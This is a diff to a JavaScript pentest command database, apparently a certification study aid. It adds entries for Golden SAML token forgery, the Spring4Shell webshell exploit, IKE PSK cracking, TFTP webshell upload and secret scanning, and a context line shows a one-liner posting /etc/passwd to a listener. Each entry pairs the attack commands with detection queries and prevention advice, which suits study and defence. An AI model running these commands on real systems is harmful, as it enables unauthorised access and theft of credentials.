@@ -55624,6 +55624,111 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "cloud-golden-saml",
+      "name": "Golden SAML - Forge Federated Authentication Tokens",
+      "command": "python3 shimit.py -idp <idp_entity_id> -pk key.pem -c cert.pem -u <user> -n <user>",
+      "description": "Golden SAML forges SAML authentication responses by stealing the AD FS (or other IdP) token-signing private key. With that key an attacker mints SAML assertions for ANY user with ANY privileges to any federated service (Microsoft 365, AWS, etc.), bypassing MFA and password changes. The cloud analog of a Golden Ticket; a key technique in SolarWinds-style intrusions.",
+      "platform": "windows",
+      "type": "attack-chain",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "Federation Attacks",
+      "certifications": [
+        "MCRTA",
+        "CRTP"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "CyberArk shimit; mandiant/ADFSDump; AADInternals",
+      "tags": [
+        "golden-saml",
+        "saml",
+        "adfs",
+        "federation",
+        "token-signing",
+        "mfa-bypass",
+        "persistence"
+      ],
+      "mitre": [
+        "T1606.002",
+        "T1552.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== 1. STEAL THE AD FS TOKEN-SIGNING KEY (on AD FS server / as DKM reader) ===\n  # Extract the private key + config (needs AD FS service account / DKM key):\n  ADFSDump.exe\n  # Or with AADInternals (PowerShell):\n  Export-AADIntADFSSigningCertificate -Filename adfs_signing.pfx\n\n=== 2. FORGE A SAML RESPONSE (shimit) ===\n  python3 shimit.py -idp http://<adfs_fqdn>/adfs/services/trust \\\n    -pk key.pem -c cert.pem -u <user>@<domain> -n <user> \\\n    -se \"https://signin.aws.amazon.com/saml\" -r <role_arn>\n  # Produces a signed assertion accepted by the SP without IdP interaction\n\n=== 3. OR FORGE WITH AADInternals (M365/Entra) ===\n  Open-AADIntOffice365Portal -ImmutableID <id> -UseBuiltInCertificate \\\n    -ByPassMFA $true -Issuer \"http://<adfs_fqdn>/adfs/services/trust\"\n\n=== WHY IT IS DEVASTATING ===\n  # - Works for ANY user/role, ANY privilege\n  # - Bypasses MFA and password resets (signature is all the SP checks)\n  # - Survives until the token-signing cert is rotated (persistence)\n\n=== PREREQUISITE ACCESS ===\n  # AD FS service account, DKM master key (AD container), or the signing cert itself\n\n=== ALTERNATIVES / RELATED ===\n  # Golden Ticket (on-prem Kerberos) - analogous krbtgt forgery\n  # Cloud token theft / app credential abuse",
+      "examples": [
+        {
+          "label": "Dump AD FS signing key",
+          "command": "Export-AADIntADFSSigningCertificate -Filename adfs_signing.pfx"
+        },
+        {
+          "label": "Forge SAML for AWS (shimit)",
+          "command": "python3 shimit.py -idp http://adfs.corp.com/adfs/services/trust -pk key.pem -c cert.pem -u admin@corp.com -n admin -se \"https://signin.aws.amazon.com/saml\" -r arn:aws:iam::111122223333:role/Admin"
+        },
+        {
+          "label": "Forge M365 access (AADInternals)",
+          "command": "Open-AADIntOffice365Portal -ImmutableID abc== -UseBuiltInCertificate -ByPassMFA $true -Issuer \"http://adfs.corp.com/adfs/services/trust\""
+        }
+      ],
+      "references": [
+        {
+          "title": "CyberArk - Golden SAML",
+          "url": "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps"
+        },
+        {
+          "title": "MITRE T1606.002 - Forge SAML Tokens",
+          "url": "https://attack.mitre.org/techniques/T1606/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-golden-ticket-mimikatz",
+          "note": "Golden Ticket is the on-prem Kerberos analog.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-azurehound",
+          "note": "Map federation/trust relationships to find AD FS.",
+          "rel": "prereq"
+        },
+        {
+          "id": "azure-app-credential-abuse",
+          "note": "App/SP credential abuse is another cloud persistence path.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Service providers trust any SAML assertion signed by the IdP token-signing key. If an attacker steals that private key, they can sign assertions for any identity with any attributes/roles - the SP never contacts the IdP to verify.",
+        "prerequisites": "Access to the AD FS token-signing private key (via AD FS service account, the DKM master key in AD, or the exported cert).",
+        "impact": "Unlimited, MFA-bypassing, password-reset-surviving access to all federated services (M365, AWS, etc.) as any user; long-term persistence.",
+        "detection": "[MITRE T1606.002/T1552.004] SAML logons with no corresponding AD FS sign-in event; assertions with unusual validity/attributes; AD FS DKM/key access; sign-ins from forged tokens (odd IssuerInstant, no MFA claim yet MFA required).",
+        "artifacts": "Mismatch between SP sign-in logs and IdP 1200/1202 events; ADFSDump/AADInternals usage; access to the DKM container / signing cert.",
+        "splunk_spl": "index=o365 OR index=azure Operation=UserLoggedIn\n| join type=left [search index=adfs EventCode=1200]\n| where isnull(adfs_event)\n| table _time, UserId, ClientIP",
+        "elastic_kql": "azure.signinlogs.properties.authentication_protocol:saml and not event.provider:\"AD FS Auditing\"",
+        "sentinel_kql": "SigninLogs\n| where AuthenticationProtocol == \"saml\"\n| join kind=leftanti (ADFSSignInLogs | project CorrelationId) on CorrelationId\n| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName",
+        "sigma_rules": "cloud_golden_saml_forged_token",
+        "prevention": "Protect/rotate AD FS token-signing keys (HSM); restrict DKM key readers; treat AD FS as Tier-0; monitor for key export; prefer cloud-native auth over on-prem federation; alert on SP logons lacking IdP events.",
+        "sources": [
+          "CyberArk",
+          "https://attack.mitre.org/techniques/T1606/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Federated logon without matching AD FS sign-in (Golden SAML)",
+            "logic": "SigninLogs\n| where ResultType == 0 and AuthenticationProtocol == \"saml\"\n| join kind=leftanti (ADFSSignInLogs | project CorrelationId) on CorrelationId\n| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName",
+            "data_source": "entra-id",
+            "attack": [
+              "T1606.002",
+              "T1552.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Log ingestion gaps between SP and IdP; non-AD FS IdPs",
+            "tuning": "Requires correlating SP sign-ins with IdP events; baseline normal federation flow"
+          }
+        ]
+      }
+    },
+    {
       "id": "crtp-golden-ticket",
       "name": "Golden Ticket Attack (Rubeus / SafetyKatz)",
       "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /user:Administrator /ptt",
@@ -60470,6 +60575,94 @@ const COMMAND_DATA = {
       ]
     },
     {
+      "id": "cdsa-m12-hayabusa",
+      "name": "Hayabusa - Sigma-Based Windows Event Log Threat Hunting",
+      "command": "hayabusa csv-timeline -d <evtx_dir> -o timeline.csv",
+      "description": "Hayabusa is a fast Windows event log (EVTX) threat-hunting and forensics timeline generator. It applies a large built-in Sigma ruleset to .evtx files to flag attacker techniques - credential dumping, lateral movement, persistence, defense evasion - producing a prioritized, colorized timeline. A core blue-team tool for rapid triage of collected Windows logs.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Blue Team",
+      "subcategory": "Log Analysis",
+      "certifications": [
+        "CDSA"
+      ],
+      "primary_cert": "CDSA",
+      "source": "Yamato-Security/hayabusa",
+      "tags": [
+        "hayabusa",
+        "evtx",
+        "sigma",
+        "threat-hunting",
+        "timeline",
+        "dfir",
+        "blue-team"
+      ],
+      "mitre": [
+        "T1059",
+        "T1003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== GENERATE A DETECTION TIMELINE ===\n  hayabusa.exe csv-timeline -d C:\\evtx_logs -o timeline.csv\n  # Single file:\n  hayabusa.exe csv-timeline -f Security.evtx -o out.csv\n\n=== LIVE ANALYSIS (local machine logs) ===\n  hayabusa.exe csv-timeline -l -o live.csv\n\n=== SUMMARY DASHBOARD ===\n  hayabusa.exe metrics -d C:\\evtx_logs       # event-ID frequency\n  hayabusa.exe logon-summary -d C:\\evtx_logs # logon stats (brute/spray)\n  hayabusa.exe pivot-keywords-list -d C:\\evtx_logs  # pivot indicators\n\n=== TUNE SEVERITY / RULES ===\n  hayabusa.exe csv-timeline -d logs -m high,critical   # only high+crit\n  hayabusa.exe update-rules                             # refresh Sigma rules\n\n=== JSON / OTHER OUTPUT ===\n  hayabusa.exe json-timeline -d logs -o timeline.json\n\n=== WORKFLOW (DFIR triage) ===\n  # 1. Collect .evtx (KAPE / velociraptor / manual)\n  # 2. hayabusa csv-timeline -> open in Timeline Explorer\n  # 3. Filter critical/high, pivot on accounts + hosts + times\n  # 4. Correlate with Sigma/YARA findings\n\n=== ALTERNATIVES ===\n  Chainsaw      # similar Sigma-over-EVTX hunting\n  EvtxECmd      # EVTX to CSV (no detection logic)\n  Sigma + SIEM  # rules applied in Splunk/Elastic/Sentinel",
+      "examples": [
+        {
+          "label": "Build detection timeline from EVTX dir",
+          "command": "hayabusa.exe csv-timeline -d C:\\evtx_logs -o timeline.csv"
+        },
+        {
+          "label": "High/critical only",
+          "command": "hayabusa.exe csv-timeline -d C:\\evtx_logs -m high,critical -o crit.csv"
+        },
+        {
+          "label": "Logon summary (spray/brute triage)",
+          "command": "hayabusa.exe logon-summary -d C:\\evtx_logs"
+        }
+      ],
+      "references": [
+        {
+          "title": "Hayabusa",
+          "url": "https://github.com/Yamato-Security/hayabusa"
+        },
+        {
+          "title": "MITRE ATT&CK",
+          "url": "https://attack.mitre.org/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cdsa-m12-sigma-rules",
+          "note": "Hayabusa applies Sigma rules to EVTX.",
+          "rel": "prereq"
+        },
+        {
+          "id": "cdsa-m12-sigma-conversion",
+          "note": "Convert Sigma to other SIEM backends.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cdsa-m13-disk-forensics",
+          "note": "Pair with disk forensics in DFIR triage.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Hayabusa is itself a defensive tool. It parses EVTX and matches Sigma detection logic to surface attacker behavior that is recorded in Windows event logs but easy to miss by hand.",
+        "prerequisites": "Collected .evtx files or live access to a Windows host; Hayabusa binary + rules.",
+        "impact": "Rapid identification of attacker activity (credential theft, lateral movement, persistence) during incident response.",
+        "detection": "This IS a detection tool - use it to detect. Ensure logging is configured so events exist to hunt: enable command-line auditing, PowerShell script-block logging, Sysmon.",
+        "artifacts": "N/A (defensive). Output timelines feed further investigation.",
+        "splunk_spl": "N/A - Hayabusa is an offline EVTX analysis tool; port its Sigma hits into Splunk for continuous detection",
+        "elastic_kql": "N/A - defensive analysis tool",
+        "sentinel_kql": "N/A - defensive analysis tool",
+        "sigma_rules": "Uses the upstream Sigma ruleset (hayabusa-rules) against EVTX",
+        "prevention": "Maximize log fidelity (Sysmon, command-line + script-block auditing, sufficient log retention); centralize EVTX collection; run Hayabusa/Chainsaw as part of IR runbooks and periodic threat hunts.",
+        "sources": [
+          "Yamato-Security",
+          "https://attack.mitre.org/"
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -64794,6 +64987,90 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Recovers IIS 8.3 short file names via the tilde disclosure bug:\n  java -jar iis_shortname_scanner.jar   the scanner\n  0 5                                    request/retry timing parameters\n  http://<ip>/                           the target\nLeaks the first 6 characters of files/dirs (e.g. TRANSF~1.ASP); build a wordlist from the recovered prefix and brute-force the full names with gobuster -x .asp,.aspx."
+    },
+    {
+      "id": "recon-ike-scan",
+      "name": "ike-scan - IPsec VPN Discovery & PSK Capture",
+      "command": "ike-scan -M <target>",
+      "description": "ike-scan discovers and fingerprints IPsec VPN gateways (IKE/ISAKMP on UDP 500) and can capture the aggressive-mode PSK hash for offline cracking. It identifies the VPN vendor from handshake behavior and detects aggressive mode, a classic misconfiguration that leaks a crackable pre-shared key. A core step when a UDP 500 service is found.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Information Gathering",
+      "subcategory": "Service Enumeration",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "royhills/ike-scan",
+      "tags": [
+        "ike-scan",
+        "ipsec",
+        "vpn",
+        "isakmp",
+        "udp-500",
+        "aggressive-mode",
+        "psk"
+      ],
+      "mitre": [
+        "T1046",
+        "T1110.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DISCOVER / FINGERPRINT (main mode) ===\n  ike-scan -M <target>\n  ike-scan -M <target> --showbackoff   # vendor fingerprint via backoff pattern\n\n=== DETECT AGGRESSIVE MODE (the win) ===\n  ike-scan -M -A <target>\n  # If it responds, aggressive mode is enabled -> PSK hash is exposed\n\n=== CAPTURE THE PSK HASH FOR CRACKING ===\n  ike-scan -M -A --pskcrack=psk.txt <target>\n  ike-scan -M -A --id=<group_id> --pskcrack=psk.txt <target>\n\n=== CRACK THE PSK OFFLINE ===\n  psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt\n  psk-crack -b 5 psk.txt           # brute force length 5\n  # or convert and use hashcat -m 5300 (IKE-PSK MD5) / 5400 (SHA1)\n\n=== ENUMERATE VALID GROUP NAMES (ID) ===\n  for id in $(cat groups.txt); do ike-scan -M -A --id=$id <target>; done\n\n=== CHECK THE PORT FIRST ===\n  nmap -sU -p500 <target>\n\n=== AFTER CRACKING PSK ===\n  # Use the PSK + a known username to connect (xauth) and pivot into the VPN\n\n=== ALTERNATIVES ===\n  nmap --script ike-version\n  strongSwan / openswan client to connect once PSK is known",
+      "examples": [
+        {
+          "label": "Fingerprint VPN gateway",
+          "command": "ike-scan -M --showbackoff 10.10.10.10"
+        },
+        {
+          "label": "Detect aggressive mode + grab PSK",
+          "command": "ike-scan -M -A --pskcrack=psk.txt 10.10.10.10"
+        },
+        {
+          "label": "Crack captured PSK",
+          "command": "psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "ike-scan",
+          "url": "https://github.com/royhills/ike-scan"
+        },
+        {
+          "title": "MITRE T1046 - Network Service Discovery",
+          "url": "https://attack.mitre.org/techniques/T1046/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gs-nmap-service-scan",
+          "note": "Find UDP 500 / the VPN service first.",
+          "rel": "prereq"
+        },
+        {
+          "id": "gs-vpn-connect",
+          "note": "Connect to the VPN once the PSK is cracked.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "IKE aggressive mode sends a hash of the pre-shared key in the initial exchange before authentication completes, letting any client capture it for offline cracking. ike-scan also fingerprints vendors from timing/backoff behavior.",
+        "prerequisites": "Reachable IKE/ISAKMP service (UDP 500); aggressive mode enabled for PSK capture.",
+        "impact": "Recovery of the VPN pre-shared key, enabling VPN access and internal network pivoting.",
+        "detection": "[MITRE T1046/T1110.002] IKE main+aggressive mode probes from one source; many ISAKMP requests with varying group IDs; UDP 500 scanning.",
+        "artifacts": "VPN gateway logs of aggressive-mode negotiations from unexpected IPs; IKE probe bursts.",
+        "splunk_spl": "index=network dest_port=500 transport=udp\n| stats count by src_ip, dest_ip\n| where count > 10",
+        "elastic_kql": "destination.port:500 and network.transport:udp",
+        "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort == 500 and Protocol == \"Udp\"\n| summarize count() by RemoteIP, DeviceName, bin(Timestamp, 10m)\n| where count_ > 10",
+        "sigma_rules": "net_ike_aggressive_mode_scan",
+        "prevention": "Disable IKE aggressive mode (use main mode); use certificate auth instead of PSK; strong/long PSKs if unavoidable; restrict VPN endpoints by source; monitor ISAKMP negotiation anomalies; prefer IKEv2.",
+        "sources": [
+          "royhills/ike-scan",
+          "https://attack.mitre.org/techniques/T1046/"
+        ]
+      }
     },
     {
       "type": "command",
@@ -150091,6 +150368,109 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "web-spring4shell",
+      "name": "Spring4Shell - Spring Framework RCE (CVE-2022-22965)",
+      "command": "nuclei -t http/cves/2022/CVE-2022-22965.yaml -u http://<target>/",
+      "description": "Spring4Shell is an unauthenticated RCE in Spring Framework (<5.3.18 / <5.2.20) running on JDK 9+ with a WAR deployment on Tomcat. It abuses data binding to reach ClassLoader properties, letting an attacker write a malicious JSP webshell to the webroot via crafted request parameters. Distinct from the earlier Spring Cloud Function SpEL bug (CVE-2022-22963).",
+      "platform": "linux",
+      "type": "payload",
+      "opsec": "loud",
+      "category": "Web Exploitation",
+      "subcategory": "Injection",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "CVE-2022-22965; Spring advisory",
+      "tags": [
+        "spring4shell",
+        "spring",
+        "cve-2022-22965",
+        "rce",
+        "java",
+        "classloader",
+        "jsp-webshell"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PRECONDITIONS ===\n  # - Spring MVC/WebFlux with @RequestMapping + POJO parameter binding\n  # - JDK 9+ (ClassLoader access reintroduced)\n  # - Deployed as WAR on Apache Tomcat (JSP writeable webroot)\n  # - Spring Framework < 5.3.18 / < 5.2.20\n\n=== DETECT (safe) ===\n  nuclei -t http/cves/2022/CVE-2022-22965.yaml -u http://<target>/\n\n=== EXPLOIT CHAIN (writes a JSP webshell via class.module.classLoader) ===\n  # The payload sets Tomcat access-log pattern + path to drop a .jsp:\n  POST /path?class.module.classLoader.resources.context.parent.pipeline.first.pattern=...\n  # Use a published PoC that automates the multi-param request:\n  python3 spring4shell.py <target_url>\n  curl http://<target>/shell.jsp?cmd=id\n\n=== MINIMAL PARAM SET (illustrative) ===\n  class.module.classLoader.resources.context.parent.pipeline.first.pattern\n  class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\n  ...directory=webapps/ROOT ...prefix=shell ...fileDateFormat=\n\n=== AFTER SHELL ===\n  curl \"http://<target>/shell.jsp?cmd=whoami\"\n  # Then upgrade to a reverse shell\n\n=== RELATED ===\n  # CVE-2022-22963 - Spring Cloud Function SpEL RCE (different bug, header-based)",
+      "examples": [
+        {
+          "label": "Detect with nuclei",
+          "command": "nuclei -t http/cves/2022/CVE-2022-22965.yaml -u http://target/"
+        },
+        {
+          "label": "Run PoC to drop JSP shell",
+          "command": "python3 spring4shell.py http://target/path"
+        },
+        {
+          "label": "Execute via dropped shell",
+          "command": "curl \"http://target/shell.jsp?cmd=id\""
+        }
+      ],
+      "references": [
+        {
+          "title": "CVE-2022-22965",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
+        },
+        {
+          "title": "Spring advisory",
+          "url": "https://spring.io/security/cve-2022-22965"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-log4shell",
+          "note": "Other high-impact Java-stack RCE to test alongside.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-ssti",
+          "note": "SpEL-based injection (incl. CVE-2022-22963) is a related path.",
+          "rel": "alternative"
+        },
+        {
+          "id": "nuclei-vuln-scan",
+          "note": "Nuclei detects Spring4Shell at scale.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "On JDK 9+, Spring data binding can traverse from a bound POJO to class.module.classLoader, reaching Tomcat internals. An attacker rewrites the access-log valve to write attacker-controlled content (a JSP) into the webroot, yielding RCE.",
+        "prerequisites": "Vulnerable Spring version on JDK 9+, WAR on Tomcat, an endpoint doing POJO parameter binding.",
+        "impact": "Unauthenticated RCE as the servlet-container user; full web server compromise.",
+        "detection": "[MITRE T1190] Requests containing class.module.classLoader / class.classLoader parameters; sudden new .jsp in webroot; Tomcat access-log pattern changes; JSP executing OS commands.",
+        "artifacts": "Suspicious binding parameters in access logs; newly written JSP files; java spawning shell processes.",
+        "splunk_spl": "index=web (uri_query=\"*class.module.classLoader*\" OR uri_query=\"*class.classLoader*\")\n| table _time, src_ip, uri_path, uri_query",
+        "elastic_kql": "url.query:(*class.module.classLoader* or *class.classLoader*)",
+        "sentinel_kql": "_Im_WebSession\n| where Url has_any (\"class.module.classLoader\",\"class.classLoader\")\n| project TimeGenerated, SrcIpAddr, Url",
+        "sigma_rules": "web_spring4shell_classloader_exploitation",
+        "prevention": "Upgrade Spring to 5.3.18+/5.2.20+; disallow binding to class/classLoader fields (disallowedFields); WAF rules for classLoader params; run Tomcat with least privilege and read-only webroot.",
+        "sources": [
+          "Spring advisory",
+          "https://attack.mitre.org/techniques/T1190/"
+        ],
+        "detections": [
+          {
+            "platform": "elastic",
+            "name": "Spring4Shell classLoader binding exploitation",
+            "logic": "url.query:(*class.module.classLoader* or *class.classLoader*) or http.request.body.content:*classLoader.resources*",
+            "data_source": "nginx",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Vulnerability scanners probing for Spring4Shell",
+            "tuning": "Correlate with new .jsp file creation in the webroot to confirm success"
+          }
+        ]
+      }
+    },
+    {
       "id": "sql-enumerate",
       "name": "SQL - Enumerate Databases and Tables",
       "command": "SELECT name FROM master.dbo.sysdatabases",
@@ -165160,6 +165540,93 @@ const COMMAND_DATA = {
       "explain": "Captures traffic and prints full packet detail with tcpdump:\n  -i eth0   capture on this interface\n  -nn       do not resolve hostnames or port names (raw IPs/ports)\n  -v        verbose protocol decoding\n  -XX       show packet contents in hex and ASCII, including link-layer headers\nGives you the full byte-level view for inspection; add -w file.pcap to save, -r file.pcap to read back, and -c N to stop after N packets."
     },
     {
+      "id": "recon-tftp",
+      "name": "TFTP Enumeration & File Access (UDP 69)",
+      "command": "tftp <target>",
+      "description": "TFTP (UDP 69) is an unauthenticated file-transfer service often left exposed on routers, VoIP phones, and backup systems. With no authentication, an attacker can download configs (router configs with creds), upload webshells to writable web roots, or brute-force known filenames. A quick win when UDP 69 is open: grab device configs or drop files.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Information Gathering",
+      "subcategory": "Service Enumeration",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "PEN-200 service enumeration; nmap NSE",
+      "tags": [
+        "tftp",
+        "udp-69",
+        "file-transfer",
+        "config-download",
+        "unauthenticated"
+      ],
+      "mitre": [
+        "T1046",
+        "T1105"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CHECK THE SERVICE ===\n  nmap -sU -p69 -sV <target>\n  nmap -sU -p69 --script tftp-enum <target>   # brute common filenames\n\n=== INTERACTIVE CLIENT ===\n  tftp <target>\n  tftp> get <remote_file> <local_file>\n  tftp> put <local_file> <remote_file>\n  tftp> quit\n\n=== NON-INTERACTIVE ===\n  tftp <target> -c get running-config\n  tftp <target> -c get <file>\n  tftp <target> -c put shell.php\n  curl -o conf tftp://<target>/<file>\n\n=== COMMON FILENAMES TO GRAB (network gear) ===\n  running-config  startup-config  <hostname>-confg\n  config.text  vlan.dat  <mac>.cfg  SEP<mac>.cnf.xml  (Cisco VoIP)\n\n=== UPLOAD A WEBSHELL (if writable + served) ===\n  tftp <target> -c put shell.php\n  # Then browse to it if the TFTP root maps to the web root\n\n=== WINDOWS TFTP (exfil/transfer during an engagement) ===\n  tftp -i <target> GET file.exe        # legacy, may be disabled\n\n=== ALTERNATIVES ===\n  atftp, tftp-hpa clients; metasploit auxiliary/admin/tftp\n  nmap tftp-enum for filename brute forcing",
+      "examples": [
+        {
+          "label": "Brute common filenames",
+          "command": "nmap -sU -p69 --script tftp-enum 10.10.10.10"
+        },
+        {
+          "label": "Download router config",
+          "command": "tftp 10.10.10.10 -c get running-config"
+        },
+        {
+          "label": "Upload a file",
+          "command": "tftp 10.10.10.10 -c put shell.php"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks - Pentesting TFTP",
+          "url": "https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp"
+        },
+        {
+          "title": "MITRE T1046",
+          "url": "https://attack.mitre.org/techniques/T1046/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gs-nmap-service-scan",
+          "note": "Identify the UDP 69 TFTP service first.",
+          "rel": "prereq"
+        },
+        {
+          "id": "recon-vnc",
+          "note": "Another commonly-exposed unauthenticated service.",
+          "rel": "alternative"
+        },
+        {
+          "id": "lolbins-transfer",
+          "note": "TFTP is one of several LOLBin file-transfer methods.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "TFTP has no authentication or access control by design. If exposed and misconfigured, anyone who can reach UDP 69 can read or write files the service has access to.",
+        "prerequisites": "Reachable TFTP service (UDP 69) with readable/writable files.",
+        "impact": "Disclosure of sensitive configs (often with credentials); webshell/file upload leading to RCE.",
+        "detection": "[MITRE T1046/T1105] TFTP read/write requests from unexpected sources; filename brute-force bursts (many RRQ with NAK responses); UDP 69 scanning.",
+        "artifacts": "TFTP server logs of RRQ/WRQ from foreign IPs; config files leaving the device; new files in the TFTP root.",
+        "splunk_spl": "index=network dest_port=69 transport=udp\n| stats count by src_ip, dest_ip\n| where count > 10",
+        "elastic_kql": "destination.port:69 and network.transport:udp",
+        "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort == 69 and Protocol == \"Udp\"\n| summarize count() by RemoteIP, DeviceName, bin(Timestamp, 10m)\n| where count_ > 10",
+        "sigma_rules": "net_tftp_access_or_bruteforce",
+        "prevention": "Disable TFTP where not required; restrict to management VLANs and specific source IPs; use SCP/SFTP instead; never store secrets in TFTP-served configs; monitor UDP 69 access.",
+        "sources": [
+          "HackTricks",
+          "https://attack.mitre.org/techniques/T1046/"
+        ]
+      }
+    },
+    {
       "id": "crtp-double-hop",
       "name": "The Kerberos Double-Hop Problem & Fixes",
       "command": "Rubeus.exe createnetonly /program:powershell.exe /show",
@@ -168189,6 +168656,90 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Pushes a local file out to your listener with an inline interpreter one-liner:\n  requests.post(\"http://<ip>:8000/upload\", ...)   POST to a Python uploadserver\n  files={\"files\":open(\"/etc/passwd\",\"rb\")}          attach the file as multipart form data\nLands the file on your box; pair it with a running uploadserver, or use the urlopen variant to just read a served file back."
+    },
+    {
+      "id": "recon-trufflehog",
+      "name": "TruffleHog / Gitleaks - Secret Scanning in Repos & Files",
+      "command": "trufflehog git https://github.com/<org>/<repo>",
+      "description": "TruffleHog and Gitleaks scan git history, filesystems, S3 buckets, and CI logs for leaked secrets: API keys, cloud credentials, private keys, tokens, and passwords. TruffleHog additionally verifies found credentials against live services. Essential recon against exposed .git directories, public repos, and dumped source for instant credential access.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Information Gathering",
+      "subcategory": "Credential Discovery",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "trufflesecurity/trufflehog; gitleaks/gitleaks",
+      "tags": [
+        "trufflehog",
+        "gitleaks",
+        "secrets",
+        "credentials",
+        "git",
+        "api-keys",
+        "recon"
+      ],
+      "mitre": [
+        "T1552.001",
+        "T1552.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== TRUFFLEHOG - SCAN A REMOTE REPO ===\n  trufflehog git https://github.com/<org>/<repo>\n  trufflehog git https://github.com/<org>/<repo> --only-verified   # live-verified creds only\n\n=== TRUFFLEHOG - LOCAL / FILESYSTEM / DUMPED .git ===\n  trufflehog git file://./repo\n  trufflehog filesystem /path/to/source\n  trufflehog filesystem /var/www --only-verified\n\n=== TRUFFLEHOG - CLOUD & CI ===\n  trufflehog s3 --bucket=<bucket>\n  trufflehog github --org=<org> --only-verified\n\n=== GITLEAKS - SCAN GIT HISTORY ===\n  gitleaks detect --source . -v\n  gitleaks detect --source . --report-path leaks.json\n  gitleaks detect --source . --log-opts=\"--all\"   # full history\n\n=== TYPICAL WORKFLOW ===\n  # 1. Find exposed .git (git-dumper) or clone target repo\n  # 2. Scan ALL history (secrets are often in old/deleted commits)\n  # 3. Verify + use any live cloud keys / API tokens immediately\n\n=== HIGH-VALUE FINDS ===\n  AWS AKIA keys, GCP service-account JSON, Azure client secrets,\n  private SSH keys, DB connection strings, Slack/GitHub tokens, JWTs\n\n=== ALTERNATIVES ===\n  git-secrets, detect-secrets, semgrep secrets rules\n  manual: git log -p | grep -iE \"password|secret|api[_-]?key|token\"",
+      "examples": [
+        {
+          "label": "Scan remote repo (verified only)",
+          "command": "trufflehog git https://github.com/acme/app --only-verified"
+        },
+        {
+          "label": "Scan dumped source filesystem",
+          "command": "trufflehog filesystem /var/www --only-verified"
+        },
+        {
+          "label": "Gitleaks full history scan",
+          "command": "gitleaks detect --source . --log-opts=\"--all\" -v"
+        }
+      ],
+      "references": [
+        {
+          "title": "TruffleHog",
+          "url": "https://github.com/trufflesecurity/trufflehog"
+        },
+        {
+          "title": "Gitleaks",
+          "url": "https://github.com/gitleaks/gitleaks"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "git-dumper-exposed-git",
+          "note": "Dump an exposed .git dir, then scan it for secrets.",
+          "rel": "prereq"
+        },
+        {
+          "id": "aws-s3-git-secrets",
+          "note": "Hunt secrets in exposed S3/git artifacts.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Secrets committed to version control persist in history even after deletion. These scanners pattern-match (and optionally verify) known credential formats across all commits and files.",
+        "prerequisites": "Access to a repo, git history, filesystem, or bucket to scan.",
+        "impact": "Immediate recovery of live cloud/API credentials enabling direct access or escalation.",
+        "detection": "[MITRE T1552.001] Largely offline against attacker-held copies. Server-side: verification attempts of found creds (sudden API calls testing keys); cloning/scraping of repos.",
+        "artifacts": "trufflehog/gitleaks on the attacker host; credential-verification hits in service logs if --only-verified is used.",
+        "splunk_spl": "index=cloudtrail eventName=GetCallerIdentity\n| stats count by sourceIPAddress, userIdentity.accessKeyId\n| where count > 5",
+        "elastic_kql": "event.action:\"GetCallerIdentity\" and source.ip:*",
+        "sentinel_kql": "AWSCloudTrail\n| where EventName == \"GetCallerIdentity\"\n| summarize count() by SourceIpAddress, bin(TimeGenerated, 5m)\n| where count_ > 5",
